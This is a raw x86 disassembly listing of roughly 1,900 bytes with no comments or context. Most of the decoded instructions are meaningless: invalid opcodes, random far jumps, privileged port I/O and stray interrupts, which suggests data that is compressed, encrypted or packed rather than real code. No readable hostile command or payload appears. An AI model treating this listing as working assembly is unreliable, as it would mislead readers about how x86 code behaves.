  409b1e:	inc    esp
  409b1f:	(bad)  
  409b20:	in     al,0xa9
  409b22:	mov    edi,0x591d35d5
  409b27:	in     al,dx
  409b28:	mov    esp,DWORD PTR [eax]
  409b2a:	sub    BYTE PTR [ebx],bl
  409b2c:	cwde   
  409b2d:	xchg   esi,eax
  409b2e:	cmp    edi,DWORD PTR [ebp-0x33c00815]
  409b34:	(bad)  
  409b36:	mov    ebp,0x34b52fea
  409b3b:	mov    dl,0x68
  409b3d:	gs (bad) 
  409b3f:	(bad)  
  409b40:	std    
  409b41:	xchg   esi,eax
  409b42:	mov    edi,eax
  409b44:	test   al,0x8c
  409b46:	or     eax,0x431f402c
  409b4b:	jmp    0x409b0c
  409b4d:	or     eax,0x11679a36
  409b52:	add    DWORD PTR [edx-0x56],eax
  409b55:	add    BYTE PTR [ecx],ah
  409b57:	shl    ch,1
  409b59:	xor    ecx,edx
  409b5b:	outs   dx,BYTE PTR ds:[esi]
  409b5c:	fisub  DWORD PTR [ebx]
  409b5e:	dec    ebp
  409b5f:	push   esi
  409b60:	mov    es,WORD PTR [ebx-0x22]
  409b63:	mov    eax,0xd537f56
  409b68:	jae    0x409aef
  409b6a:	adc    eax,0x906b7ea4
  409b6f:	mov    ebx,0x2c9611c2
  409b74:	test   eax,0x2f5db4ae
  409b79:	mov    ebp,?
  409b7b:	test   ecx,eax
  409b7d:	add    BYTE PTR [ecx-0x5ca53263],cl
  409b83:	inc    edi
  409b84:	mov    al,ds:0x7cce147d
  409b89:	test   al,0xbf
  409b8b:	add    esp,DWORD PTR [esi*1+0x7bf7cb42]
  409b92:	cmp    dh,ah
  409b94:	fcomp  DWORD PTR [edx-0xd]
  409b97:	outs   dx,DWORD PTR ds:[esi]
  409b98:	les    esp,FWORD PTR [ecx+0x22]
  409b9b:	lock ret 
  409b9d:	pop    ss
  409b9e:	inc    ebx
  409b9f:	int3   
  409ba0:	fiadd  DWORD PTR [eax]
  409ba3:	pop    ebp
  409ba4:	jg     0x409b47
  409ba6:	sar    ah,1
  409ba8:	mov    ds:0x13373574,eax
  409bad:	in     eax,dx
  409bae:	adc    eax,0x1d9f7cc4
  409bb3:	fbstp  TBYTE PTR [ebx]
  409bb5:	rcl    BYTE PTR [ebx],1
  409bb7:	jmp    0xd8b2:0xb46feb54
  409bbe:	lods   al,BYTE PTR ds:[esi]
  409bbf:	mov    esp,0x90d3a953
  409bc4:	mov    esp,0x6115c5bd
  409bc9:	pop    edx
  409bca:	mov    ?,WORD PTR [esi]
  409bcc:	adc    al,0x31
  409bce:	adc    DWORD PTR [esi+0x79326777],edi
  409bd4:	lods   al,BYTE PTR ds:[esi]
  409bd5:	pop    esi
  409bd6:	iret   
  409bd7:	adc    al,BYTE PTR [esp+esi*2-0xb]
  409bdb:	push   ebx
  409bdc:	retf   0xc015
  409bdf:	jmp    0x409bd8
  409be1:	adc    ch,BYTE PTR [edi-0x22]
  409be4:	pop    edi
  409be5:	jmp    0x30d8da02
  409bea:	push   ds
  409beb:	call   0x2a2a:0xbfd01894
  409bf2:	push   ebp
  409bf3:	lahf   
  409bf4:	push   ebp
  409bf5:	(bad)  
  409bf6:	jo     0x409c4e
  409bf8:	int    0x91
  409bfa:	xor    al,BYTE PTR [ecx-0x421579fe]
  409c00:	das    
  409c01:	pop    ebp
  409c02:	jp     0x409bd6
  409c04:	or     DWORD PTR [esi],0x9320a969
  409c0a:	cdq    
  409c0b:	adc    DWORD PTR [ebx],edx
  409c0d:	jmp    0x409ba6
  409c0f:	sub    DWORD PTR [edi],0x96edf4c5
  409c15:	jb     0x409c5a
  409c17:	add    DWORD PTR [esi-0x7103bc41],ecx
  409c1d:	sub    dh,BYTE PTR [esi-0x8]
  409c20:	addr16 jp 0x409c89
  409c23:	fdiv   DWORD PTR [ebp-0x54accde0]
  409c29:	and    dh,BYTE PTR [eax-0x6886a7d2]
  409c2f:	pop    esi
  409c30:	and    al,0x7a
  409c32:	call   DWORD PTR [esp+ecx*1]
  409c35:	rol    BYTE PTR [edi+0x40],0xcf
  409c39:	in     al,0xb7
  409c3b:	aaa    
  409c3c:	push   edx
  409c3e:	lea    eax,[ebx+0x5b]
  409c41:	scas   eax,DWORD PTR es:[edi]
  409c42:	and    DWORD PTR [edi],0xffffff82
  409c45:	mov    edx,cs
  409c47:	aas    
  409c48:	dec    edx
  409c49:	xchg   esp,eax
  409c4a:	jecxz  0x409c6e
  409c4c:	(bad)  
  409c4d:	fcom   QWORD PTR [bx+si-0x25]
  409c51:	lods   eax,DWORD PTR ds:[esi]
  409c52:	gs fcom st(0)
  409c55:	or     eax,0xd4e7550c
  409c5a:	aad    0x1
  409c5c:	ror    DWORD PTR [ecx],0xb4
  409c5f:	cmp    al,BYTE PTR [ebx]
  409c61:	aaa    
  409c62:	pop    ds
  409c63:	mov    ebp,0xba99d241
  409c68:	std    
  409c69:	loope  0x409cc1
  409c6b:	push   cs
  409c6c:	or     dh,cl
  409c6e:	pusha  
  409c6f:	rcl    ch,1
  409c71:	and    esi,esi
  409c73:	jbe    0x409c44
  409c75:	push   edx
  409c76:	loop   0x409c47
  409c78:	aaa    
  409c79:	pop    ebp
  409c7a:	and    DWORD PTR [edi+0x5d21c7d8],esp
  409c80:	inc    edx
  409c81:	lods   al,BYTE PTR ds:[esi]
  409c82:	mov    ebp,0x274aab1e
  409c87:	iret   
  409c88:	fldenv [edx-0x48b41e78]
  409c8e:	push   eax
  409c8f:	sti    
  409c90:	mov    bh,0xf
  409c92:	xor    eax,0x5ddbecff
  409c97:	mov    ebp,DWORD PTR ds:0x2242abab
  409c9d:	sbb    eax,esp
  409c9f:	xchg   DWORD PTR [esi-0x6a],esi
  409ca2:	pop    esi
  409ca3:	jbe    0x409cbf
  409ca5:	in     eax,0x51
  409ca7:	(bad)  
  409ca9:	les    ebp,FWORD PTR [eax]
  409cab:	xor    al,0x37
  409cad:	sub    DWORD PTR [ecx-0x74d502d4],0x8e776b90
  409cb7:	bound  ebx,QWORD PTR [ebp+esi*8-0xac55dbe]
  409cbe:	sbb    al,0x4f
  409cc0:	cmp    al,0x7b
  409cc2:	or     eax,0x1017fbd8
  409cc7:	xchg   edx,eax
  409cc8:	add    eax,0x64a26acf
  409ccd:	mov    ah,0xe1
  409ccf:	and    dh,dh
  409cd1:	scas   al,BYTE PTR es:[edi]
  409cd2:	or     BYTE PTR [edi],cl
  409cd4:	and    al,0x54
  409cd6:	xor    BYTE PTR [esi-0x57],0x69
  409cda:	loop   0x409d54
  409cdc:	jmp    0x409cbb
  409cde:	adc    eax,0x2648f1cb
  409ce3:	lods   al,BYTE PTR ds:[esi]
  409ce4:	sub    eax,0xa500f6b8
  409ce9:	add    cl,BYTE PTR [ebp+0x3c55f0ce]
  409cef:	enter  0xbfbe,0xe5
  409cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cf4:	xlat   BYTE PTR ds:[ebx]
  409cf5:	fistp  QWORD PTR [edi]
  409cf7:	xchg   ah,ch
  409cf9:	and    al,0xee
  409cfb:	sahf   
  409cfc:	imul   ebx,esi,0xffffff9f
  409cff:	fs push ss
  409d01:	and    eax,0xeb976933
  409d06:	dec    ecx
  409d07:	shl    ecx,1
  409d09:	mov    BYTE PTR [esi-0x7916a635],dh
  409d0f:	(bad)  
  409d10:	pop    ss
  409d11:	jo     0x409d3e
  409d13:	je     0x409d33
  409d15:	(bad)  
  409d16:	in     al,0x14
  409d18:	fstp   QWORD PTR [ebx+0x11]
  409d1b:	inc    esp
  409d1c:	add    dh,al
  409d1e:	dec    eax
  409d1f:	leave  
  409d20:	inc    ebx
  409d21:	fsincos 
  409d23:	js     0x409d14
  409d25:	xor    edi,DWORD PTR [esi]
  409d27:	imul   esi,ebp,0x3cd50e
  409d2d:	icebp  
  409d2e:	out    dx,al
  409d2f:	dec    ecx
  409d30:	xchg   edi,eax
  409d31:	test   ebp,esi
  409d33:	inc    esi
  409d34:	push   edx
  409d35:	ss dec eax
  409d37:	test   dl,0x9e
  409d3a:	or     edi,DWORD PTR [ebp+0x4a]
  409d3d:	cmp    esp,DWORD PTR [eax+0x4c]
  409d40:	rcr    BYTE PTR [eax-0x68891bbc],1
  409d46:	into   
  409d47:	push   ds
  409d48:	cmp    al,0x96
  409d4a:	lds    ecx,FWORD PTR [eax+0x56]
  409d4d:	cwde   
  409d4e:	mov    esp,DWORD PTR [ecx]
  409d50:	in     eax,dx
  409d51:	stos   DWORD PTR es:[edi],eax
  409d52:	mov    ecx,DWORD PTR [eax]
  409d54:	add    al,0x75
  409d56:	jno    0x409d42
  409d58:	sar    ch,cl
  409d5a:	adc    al,0x8f
  409d5c:	stos   BYTE PTR es:[edi],al
  409d5d:	add    DWORD PTR [esi+0x49],edi
  409d60:	mov    cl,0xf1
  409d62:	shl    DWORD PTR ds:0x5feb1bc4,1
  409d68:	mov    eax,ds:0xfd5b702d
  409d6d:	dec    eax
  409d6e:	ret    0xb5ec
  409d71:	loopne 0x409da3
  409d73:	das    
  409d74:	jo     0x409d31
  409d76:	or     esi,DWORD PTR [edi-0x17]
  409d79:	push   esp
  409d7a:	in     al,dx
  409d7b:	fcomp  DWORD PTR [esi]
  409d7d:	mov    eax,ds:0x2cacea53
  409d82:	ins    DWORD PTR es:[edi],dx
  409d83:	iret   
  409d84:	ret    
  409d85:	arpl   dx,si
  409d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d88:	sub    al,0xb7
  409d8a:	mov    edx,0x845aacf6
  409d8f:	pop    ecx
  409d90:	aad    0x6b
  409d92:	add    BYTE PTR ds:[esi],ch
  409d95:	fnsave [esi]
  409d97:	(bad)  
  409d98:	loop   0x409d81
  409d9a:	mov    esp,0xb53220fc
  409d9f:	push   0xaea15f5a
  409da4:	cwde   
  409da5:	pusha  
  409da6:	push   eax
  409da7:	xchg   dl,ah
  409da9:	in     eax,0x30
  409dab:	pop    ss
  409dac:	ret    0xab0f
  409daf:	adc    DWORD PTR [eax-0x6e],ecx
  409db2:	dec    ecx
  409db3:	xor    ecx,DWORD PTR [eax+0xe]
  409db6:	inc    edx
  409db7:	xchg   ebx,eax
  409db8:	xchg   edi,eax
  409db9:	(bad)  
  409dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dbb:	ins    DWORD PTR es:[edi],dx
  409dbc:	mov    eax,ds:0xcf704196
  409dc1:	punpcklbw mm7,DWORD PTR [ebx]
  409dc4:	loope  0x409d5d
  409dc6:	(bad)  
  409dc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dc9:	xor    edx,DWORD PTR [ecx-0x7581e4fd]
  409dcf:	stos   DWORD PTR es:[edi],eax
  409dd0:	mov    esi,0xfb4b913c
  409dd5:	mov    edx,0xbdc9772b
  409dda:	in     eax,0xc3
  409ddc:	in     al,0x93
  409dde:	adc    eax,0x660fec76
  409de3:	addr16 je 0x409d80
  409de6:	mov    edi,0x94228427
  409deb:	adc    eax,ecx
  409ded:	xchg   esp,eax
  409dee:	add    ebp,DWORD PTR [edx]
  409df0:	pop    ecx
  409df1:	jecxz  0x409dfd
  409df3:	(bad)  
  409df4:	fisttp WORD PTR [edi+0x30]
  409df7:	push   esp
  409df8:	test   eax,edi
  409dfa:	data16 lods al,BYTE PTR ds:[esi]
  409dfc:	or     BYTE PTR [ebp+0x63],dl
  409dff:	cmp    eax,0x9d82ebe7
  409e04:	js     0x409e77
  409e06:	repnz and BYTE PTR [edx],bl
  409e09:	xchg   edi,eax
  409e0a:	gs adc al,0x6f
  409e0d:	xor    esp,ebp
  409e0f:	loop   0x409e43
  409e11:	add    esi,DWORD PTR [edi-0x34]
  409e14:	adc    BYTE PTR [ebx-0x1c51ba1d],0x4a
  409e1b:	inc    esi
  409e1c:	or     ebp,DWORD PTR [ebp-0x38]
  409e1f:	lea    edi,[edi+0x1eed4959]
  409e25:	lahf   
  409e26:	test   al,0x4c
  409e28:	js     0x409e82
  409e2a:	cmp    al,0x1a
  409e2c:	adc    DWORD PTR [edx],ebp
  409e2e:	push   es
  409e2f:	fidiv  DWORD PTR [edx]
  409e31:	cmc    
  409e32:	in     al,0xe5
  409e34:	sbb    BYTE PTR [ecx-0x77],ah
  409e37:	(bad)  
  409e38:	or     DWORD PTR [ebx+0x32],ebp
  409e3b:	and    eax,0x1657f8bc
  409e40:	pop    ds
  409e41:	sub    al,0x61
  409e43:	cdq    
  409e44:	nop
  409e45:	push   es
  409e46:	adc    DWORD PTR [esi],esi
  409e48:	ror    BYTE PTR ds:0x81e9cd27,cl
  409e4e:	std    
  409e4f:	ror    BYTE PTR [edi-0x21405dd6],cl
  409e55:	pop    es
  409e56:	stos   DWORD PTR es:[edi],eax
  409e57:	push   edi
  409e58:	and    eax,0x7c97e5fb
  409e5d:	stos   DWORD PTR es:[edi],eax
  409e5e:	in     al,dx
  409e5f:	les    ebp,FWORD PTR [edx]
  409e61:	pop    eax
  409e62:	cmp    ebp,DWORD PTR [eax]
  409e64:	ss push esi
  409e66:	inc    edx
  409e67:	add    eax,0x29d15adb
  409e6c:	sub    BYTE PTR [eax-0x79],ch
  409e6f:	fisttp DWORD PTR [esi-0x7f]
  409e72:	stc    
  409e73:	cld    
  409e74:	jg     0x409ef3
  409e76:	xchg   edi,eax
  409e77:	push   esi
  409e78:	ss loopne 0x409e99
  409e7b:	sahf   
  409e7c:	pop    edi
  409e7d:	push   ds
  409e7e:	rdpmc  
  409e80:	dec    ebp
  409e81:	mov    es,WORD PTR [ecx+0x6b541a39]
  409e87:	retf   0x2690
  409e8a:	sar    edx,cl
  409e8c:	mov    ds:0x2f3e6858,eax
  409e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e92:	leave  
  409e93:	add    ch,ch
  409e95:	adc    cl,dl
  409e97:	and    ebx,esp
  409e99:	in     eax,0xfe
  409e9b:	sub    al,0xd
  409e9d:	pop    eax
  409e9e:	lods   eax,DWORD PTR ds:[esi]
  409e9f:	std    
  409ea0:	adc    al,0x4e
  409ea2:	outs   dx,DWORD PTR ds:[esi]
  409ea3:	xor    bl,BYTE PTR [esi-0x4]
  409ea6:	xor    edi,esi
  409ea8:	adc    eax,0x9424c65e
  409ead:	xchg   BYTE PTR [ebx-0x804f64c],bl
  409eb3:	loope  0x409f21
  409eb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb6:	jns    0x409f0b
  409eb8:	call   0x2f0:0x7d550a1e
  409ebf:	mov    edi,0x31daa88
  409ec4:	cmc    
  409ec5:	mov    BYTE PTR [edx-0x9458d62],bh
  409ecb:	int    0x7b
  409ecd:	mov    ebx,0x28b3901
  409ed2:	pop    ss
  409ed3:	jo     0x409e55
  409ed5:	fild   DWORD PTR [ecx-0x69868100]
  409edb:	xor    bl,ch
  409edd:	dec    ebp
  409ede:	pop    es
  409edf:	arpl   WORD PTR ds:0xafbdfb07,dx
  409ee5:	and    BYTE PTR [ecx+eiz*2],cl
  409ee8:	stos   BYTE PTR es:[edi],al
  409ee9:	adc    BYTE PTR [eax-0x4daec037],0x3a
  409ef0:	pop    es
  409ef1:	cmp    dl,cl
  409ef3:	mov    esi,0x956142c5
  409ef8:	outs   dx,DWORD PTR ds:[esi]
  409ef9:	inc    edi
  409efa:	sbb    edx,DWORD PTR [ecx+0x1b4a6fc2]
  409f00:	push   esi
  409f01:	jge    0x409f56
  409f03:	xchg   bx,ax
  409f05:	icebp  
  409f06:	call   0xabcd:0xfe149834
  409f0d:	mov    ds:0x4a9d1ae8,eax
  409f12:	or     al,0xb9
  409f14:	push   ebx
  409f15:	iret   
  409f16:	sbb    esi,ebx
  409f18:	cmp    eax,0x90fc8278
  409f1d:	retf   
  409f1e:	js     0x409ecc
  409f20:	jb     0x409ed9
  409f22:	or     eax,0x7fe176f4
  409f27:	aaa    
  409f28:	sub    al,0xe3
  409f2a:	mov    edi,0xcd6bb98f
  409f2f:	or     DWORD PTR [edx],0xffffffaf
  409f32:	pop    ebp
  409f33:	(bad)  
  409f34:	shl    BYTE PTR [esi+0x4f],1
  409f37:	add    bx,WORD PTR [edx]
  409f3a:	jmp    0x460a2289
  409f3f:	imul   ebx,ebx,0x5c
  409f42:	enter  0xa4ac,0x12
  409f46:	xchg   edx,eax
  409f47:	mov    al,ds:0x1d59cd25
  409f4c:	rcr    DWORD PTR [edx],cl
  409f4e:	inc    esp
  409f4f:	scas   al,BYTE PTR es:[edi]
  409f50:	test   BYTE PTR [eax],ah
  409f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f53:	mov    ecx,0x58cff58a
  409f58:	test   ebp,esi
  409f5a:	sahf   
  409f5b:	retf   0xc0db
  409f5e:	xlat   BYTE PTR ds:[ebx]
  409f5f:	leave  
  409f60:	hlt    
  409f61:	pop    es
  409f62:	jbe    0x409ef3
  409f64:	js     0x409fa4
  409f66:	xchg   esp,eax
  409f67:	les    esp,FWORD PTR [edx-0x67d9da62]
  409f6d:	sbb    al,0xf8
  409f6f:	add    eax,0x9c0bac50
  409f74:	xor    eax,0x46daf435
  409f79:	jmp    FWORD PTR [ebx-0x2e8b54e7]
  409f7f:	ins    DWORD PTR es:[edi],dx
  409f80:	xor    dl,BYTE PTR [edi+0x374caa87]
  409f86:	es scas eax,DWORD PTR es:[edi]
  409f88:	mov    WORD PTR [ebp-0x37f2276],gs
  409f8e:	aad    0xda
  409f90:	jmp    0xf286:0x7af878eb
  409f97:	xchg   esp,eax
  409f98:	mov    ebx,?
  409f9a:	push   eax
  409f9b:	retf   0x6ae4
  409f9e:	fisub  DWORD PTR [ebx]
  409fa0:	out    dx,eax
  409fa1:	popf   
  409fa2:	popf   
  409fa3:	or     cl,BYTE PTR [ebx-0x178e2fa]
  409fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409faa:	outs   dx,DWORD PTR ds:[esi]
  409fab:	and    eax,0x4596f9e0
  409fb0:	jmp    0xc6f31004
  409fb5:	xchg   esp,eax
  409fb6:	lods   eax,DWORD PTR fs:[esi]
  409fb8:	pop    ebx
  409fb9:	mov    edi,0xfcd68225
  409fbf:	mov    al,0xed
  409fc1:	adc    DWORD PTR [esp+0x596299fb],0x35
  409fc9:	rcl    DWORD PTR [edi],1
  409fcb:	xchg   ecx,eax
  409fcc:	jne    0x409f4f
  409fce:	cmc    
  409fcf:	fistp  DWORD PTR [eax+0x7b04d39a]
  409fd5:	adc    esp,DWORD PTR [eax+esi*1+0x73]
  409fd9:	out    0x37,al
  409fdb:	pop    esi
  409fdc:	(bad)  
  409fdd:	retf   
  409fde:	test   al,0x2
  409fe0:	dec    esp
  409fe1:	call   FWORD PTR [esi-0x6b]
  409fe4:	sbb    DWORD PTR [edx+0x64],ebx
  409fe7:	adc    edx,DWORD PTR es:[ebx]
  409fea:	cwde   
  409feb:	fmul   DWORD PTR [eax]
  409fed:	adc    ch,ah
  409fef:	les    edx,FWORD PTR [ebp+0x1b]
  409ff2:	jmp    0x1095:0x66fd6dd3
  409ff9:	push   0x4b
  409ffb:	jb     0x409fa3
  409ffd:	lods   eax,DWORD PTR ds:[esi]
  409ffe:	adc    BYTE PTR [esi+0x6289070d],dl
  40a004:	repnz xchg ebp,eax
  40a006:	xchg   edx,eax
  40a007:	dec    edi
  40a008:	xchg   esp,eax
  40a009:	dec    ecx
  40a00a:	ss stc 
  40a00c:	jl     0x409ff5
  40a00e:	mov    ebx,0x12aee674
  40a013:	xor    BYTE PTR [edx+edi*4-0x1],0x93
  40a018:	xor    al,0x37
  40a01a:	hlt    
  40a01b:	mov    ds:0xbf7374e4,eax
  40a020:	xor    eax,0x65513b61
  40a025:	pop    ds
  40a026:	push   DWORD PTR [edi-0x43]
  40a029:	push   eax
  40a02a:	test   al,0x63
  40a02c:	dec    edi
  40a02d:	ja     0x40a099
  40a02f:	or     esi,DWORD PTR [ebx+0x79]
  40a032:	and    eax,0xabef67b0
  40a037:	dec    ebx
  40a038:	xchg   BYTE PTR [edi-0x39e64a97],cl
  40a03e:	push   edx
  40a03f:	in     al,0xbf
  40a041:	into   
  40a042:	call   0xf337:0xe8acc173
  40a049:	adc    BYTE PTR [ecx-0x33],bl
  40a04c:	lock xor bh,BYTE PTR [edi+ecx*2]
  40a050:	bound  edi,QWORD PTR [eax+0x6b17c611]
  40a056:	adc    BYTE PTR [esi+0x55e8b20e],cl
  40a05c:	mov    ebx,DWORD PTR [ecx]
  40a05e:	mov    ebx,0xfa5184ec
  40a063:	jb     0x40a0dc
  40a065:	pop    ebx
  40a066:	nop
  40a067:	mov    DWORD PTR [eax-0x65],0xf0fd2913
  40a06e:	push   ds
  40a06f:	adc    DWORD PTR [edi],esi
  40a071:	push   edx
  40a072:	mov    al,ds:0x32a7fafb
  40a077:	add    ch,ch
  40a079:	sahf   
  40a07a:	pop    edx
  40a07b:	mov    ah,0x8d
  40a07d:	div    BYTE PTR [ecx+0x67940ab2]
  40a083:	(bad)  
  40a084:	mov    esi,0x2fd73a5f
  40a089:	dec    esp
  40a08a:	lds    ebx,FWORD PTR [eax]
  40a08c:	loope  0x40a0f6
  40a08e:	sub    ch,BYTE PTR [esi+0x5c470292]
  40a094:	mov    dh,0xe9
  40a096:	ret    
  40a097:	push   edi
  40a098:	scas   al,BYTE PTR es:[edi]
  40a099:	out    dx,eax
  40a09a:	sbb    eax,0x5b6044f0
  40a09f:	test   al,0x35
  40a0a1:	fist   WORD PTR [esi+0x4c97804e]
  40a0a7:	ins    DWORD PTR es:[edi],dx
  40a0a8:	(bad)  
  40a0a9:	and    eax,0x115ce66
  40a0ae:	inc    ecx
  40a0af:	mov    ecx,0x2006675a
  40a0b4:	lea    ebx,[ebx-0x5c2cc68b]
  40a0ba:	ret    
  40a0bb:	cmp    edi,DWORD PTR [eax-0x11788d9f]
  40a0c1:	xor    BYTE PTR [eax-0x778b1591],ch
  40a0c7:	jno    0x40a0ba
  40a0c9:	ds mov cl,0xe1
  40a0cc:	mov    bh,BYTE PTR [eax-0x3e033a1d]
  40a0d2:	fcomp  st(0)
  40a0d4:	syscall 
  40a0d6:	ja     0x40a144
  40a0d8:	sub    eax,0xac8768f9
  40a0dd:	daa    
  40a0de:	jo     0x40a069
  40a0e0:	adc    BYTE PTR [ecx+0xc],cl
  40a0e3:	mov    DWORD PTR [esi+0x74],ebp
  40a0e6:	pop    eax
  40a0e7:	fldcw  WORD PTR [ebx+0x1c]
  40a0ea:	fwait
  40a0eb:	cmp    ecx,DWORD PTR [ebp+0x2fef1020]
  40a0f1:	mov    edi,0xe261f6a4
  40a0f6:	es iret 
  40a0f8:	add    ecx,edx
  40a0fa:	hlt    
  40a0fb:	int    0x93
  40a0fd:	mov    ds:0x83ab05e8,al
  40a102:	cmp    al,0xfc
  40a104:	std    
  40a105:	sub    al,0x74
  40a107:	aas    
  40a108:	xchg   edx,eax
  40a109:	ss push eax
  40a10b:	mov    dh,0x50
  40a10d:	cmp    DWORD PTR [edi],ebp
  40a10f:	fsubrp st(1),st
  40a111:	add    BYTE PTR [edx+0x1f1877af],cl
  40a117:	addr16 push 0xb9591772
  40a11d:	call   0x3fb6:0xec8ebbf2
  40a124:	mov    ebp,0xccd4a26a
  40a129:	(bad)  
  40a12a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a12b:	retf   
  40a12c:	outs   dx,DWORD PTR ds:[esi]
  40a12d:	pop    es
  40a12e:	dec    ebx
  40a12f:	jmp    0x7c3f674
  40a134:	mov    dl,0xa8
  40a136:	adc    BYTE PTR [edi+0x2b],0x56
  40a13a:	jecxz  0x40a0c4
  40a13c:	add    al,0x30
  40a13e:	adc    edx,DWORD PTR [si+0x6ba0]
  40a143:	add    eax,0xa2cadaef
  40a148:	arpl   WORD PTR ds:0x4c969569,sp
  40a14e:	mov    eax,0x8e936206
  40a153:	scas   eax,DWORD PTR es:[edi]
  40a154:	out    dx,eax
  40a155:	inc    BYTE PTR [edi]
  40a157:	jns    0x40a159
  40a159:	ror    BYTE PTR [ebp-0x2715e461],0x4f
  40a160:	or     al,0xd
  40a162:	test   dl,dl
  40a164:	jle    0x40a109
  40a166:	scas   al,BYTE PTR es:[edi]
  40a167:	adc    BYTE PTR [ebp+ebx*4+0x1],0xe5
  40a16c:	out    0xa7,al
  40a16e:	xor    BYTE PTR [eax],cl
  40a170:	sub    DWORD PTR [eax],edx
  40a172:	into   
  40a173:	mov    bl,0x27
  40a175:	mov    dl,0xab
  40a177:	cmp    BYTE PTR [eax-0x70],0x24
  40a17b:	mov    edi,0xd1fce487
  40a180:	lock gs xor eax,0x9d3ac39a
  40a187:	pop    esp
  40a188:	dec    esp
  40a189:	mov    al,0xee
  40a18b:	sti    
  40a18c:	mov    edi,0x83e856fd
  40a191:	push   edi
  40a192:	jmp    0x9d30964
  40a197:	pop    edx
  40a198:	xchg   ebx,eax
  40a199:	cmp    BYTE PTR [esi+0x43],0x70
  40a19d:	jbe    0x40a19c
  40a19f:	inc    ecx
  40a1a0:	clc    
  40a1a1:	inc    ebx
  40a1a2:	xor    BYTE PTR [ecx+ebx*1-0x5a],bh
  40a1a6:	out    dx,eax
  40a1a7:	imul   edx,edi,0xe8df7acf
  40a1ad:	lock int3 
  40a1af:	xchg   cl,bl
  40a1b1:	dec    esi
  40a1b2:	scas   al,BYTE PTR es:[edi]
  40a1b3:	jb     0x40a19e
  40a1b5:	xchg   ecx,eax
  40a1b6:	jg     0x40a185
  40a1b8:	mov    DWORD PTR [eax+0x2b],edx
  40a1bb:	mov    edi,0xde4a99ed
  40a1c0:	sub    DWORD PTR [ebp+0x27],esi
  40a1c3:	jbe    0x40a1e1
  40a1c5:	mov    WORD PTR [edi+0x2722fa7c],gs
  40a1cb:	fwait
  40a1cc:	sbb    al,0x5f
  40a1ce:	jle    0x40a16b
  40a1d0:	or     eax,0x14c92e0
  40a1d5:	jecxz  0x40a182
  40a1d7:	adc    DWORD PTR [eax-0x453d47c],edi
  40a1dd:	ret    
  40a1de:	das    
  40a1df:	test   BYTE PTR [ebx],al
  40a1e1:	inc    eax
  40a1e2:	popf   
  40a1e3:	in     eax,0x54
  40a1e5:	push   edi
  40a1e6:	call   esi
  40a1e8:	lods   eax,DWORD PTR ds:[esi]
  40a1e9:	jae    0x40a24b
  40a1eb:	lea    edi,[ebx+eax*2+0x5c9ac318]
  40a1f2:	into   
  40a1f3:	sub    esi,DWORD PTR [edx+0x36]
  40a1f6:	dec    eax
  40a1f7:	mov    dl,0xb8
  40a1f9:	pop    esp
  40a1fa:	add    al,0x96
  40a1fc:	imul   ecx,DWORD PTR [edi],0x32c675d9
  40a202:	push   cs
  40a203:	retf   
  40a204:	sub    BYTE PTR [ebp+0x20d92eb],bh
  40a20a:	push   ebx
  40a20b:	scas   al,BYTE PTR es:[edi]
  40a20c:	cmp    eax,DWORD PTR [edi+0x15]
  40a20f:	inc    eax
  40a210:	outs   dx,BYTE PTR ds:[esi]
  40a211:	inc    ecx
  40a212:	mov    ah,0xd8
  40a214:	pushf  
  40a215:	into   
  40a216:	pop    edx
  40a217:	rol    ecx,0x5e
  40a21a:	pop    es
  40a21b:	and    bl,dh
  40a21d:	push   edi
  40a21e:	cwde   
  40a21f:	icebp  
  40a220:	ror    DWORD PTR [esi+0x30],cl
  40a223:	adc    bl,BYTE PTR [ecx]
  40a225:	pop    esi
  40a226:	pop    ebp
  40a227:	push   ebp
  40a228:	and    DWORD PTR [ecx],edi
  40a22a:	xor    DWORD PTR [eax+0x518f81c6],esp
  40a230:	inc    esi
  40a231:	inc    ebx
  40a232:	jg     0x40a1ef
  40a234:	neg    dl
  40a236:	sub    esi,ebx
  40a238:	sub    dl,cl
  40a23a:	dec    esp
  40a23b:	sbb    al,bl
  40a23d:	push   ebp
  40a23e:	jp     0x40a25f
  40a240:	push   esp
  40a241:	xor    eax,0xa1ec2cf3
  40a246:	stos   DWORD PTR es:[edi],eax
  40a247:	adc    eax,0x8d415d1b
  40a24c:	jnp    0x40a26c
  40a24e:	sbb    al,0x94
  40a250:	xor    ah,BYTE PTR [esi]
  40a252:	js     0x40a28f
  40a254:	xchg   esi,eax
  40a255:	stc    
  40a256:	sbb    eax,0x83a6c246
  40a25b:	(bad)  
  40a25c:	mov    esi,0x2095809a
  40a261:	int3   
  40a262:	add    esi,DWORD PTR [edi]
  40a264:	push   ecx
  40a265:	inc    esi
  40a266:	jmp    0x40a27c
  40a268:	jge    0x40a294
  40a26a:	mov    ?,WORD PTR [ecx]
  40a26c:	test   bh,bl
  40a26e:	cwde   
  40a26f:	sahf   
  40a270:	fidivr WORD PTR [eax+0x3411fbbd]
  40a276:	push   ecx
  40a277:	test   esp,esp
  40a279:	ror    ch,1
  40a27b:	cmp    BYTE PTR [eax],bh
  40a27d:	leavew 
  40a27f:	or     eax,0x1b862a3f
  40a284:	not    BYTE PTR [eax+0x66]
  40a287:	ins    BYTE PTR es:[edi],dx
  40a288:	outs   dx,DWORD PTR ds:[esi]
  40a289:	call   0xfb4c:0x82637a18
  40a290:	mov    DWORD PTR [ebx],0x4285f979
  40a296:	xchg   edx,eax
  40a297:	xchg   ebx,eax
  40a298:	je     0x40a30e
  40a29a:	sahf   
  40a29b:	leave  
  40a29c:	mov    cl,0xd6
  40a29e:	adc    BYTE PTR [eax],0x74
  40a2a1:	icebp  
  40a2a2:	jbe    0x40a280
  40a2a4:	add    DWORD PTR [ecx+0x688a5214],ebp
  40a2aa:	imul   ebp,DWORD PTR [eax],0xffffffd7
  40a2ad:	sub    eax,0x644694c3
  40a2b2:	mov    al,ds:0xf9e80c11
  40a2b7:	test   BYTE PTR [edi],0xd9
  40a2ba:	ret    0xbfae
  40a2bd:	pop    ss
  40a2be:	xor    edx,esi
  40a2c0:	dec    edi
